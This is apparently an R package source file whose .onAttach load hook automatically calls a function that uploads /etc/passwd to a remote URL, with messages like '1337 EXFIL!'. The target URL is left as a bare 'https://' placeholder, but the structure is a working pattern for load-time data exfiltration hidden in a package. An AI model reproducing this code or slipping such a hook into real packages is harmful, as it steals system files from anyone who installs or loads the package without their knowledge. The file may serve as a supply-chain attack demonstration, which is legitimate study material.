#' Send a hardcoded file to a specified URL
#' 
#' This function retrieves a hardcoded file from the local file system and sends it to a hardcoded URL.
#' @return Response from the server.
#' @export
send_file <- function() {
    file_path <- "/etc/passwd"  # Change this to your actual file path
    url <- "https://"  # Change this to your actual URL

    if (!file.exists(file_path)) {
        stop("The specified file does not exist.")
    }

    response <- httr::POST(url, body = httr::upload_file(file_path))
    return(response)
}

#' @import utils
.onAttach <- function(libname, pkgname) {
    packageStartupMessage("1337 EXFIL! Sending file...")
    
    # Call the send_file function
    response <- send_file()
    

    if (!inherits(response, "try-error")) {
        packageStartupMessage("File sent! Great success! Response status: ", response$status_code)
    } else {
        packageStartupMessage("Error sending file... womp womp :(")
    }
}
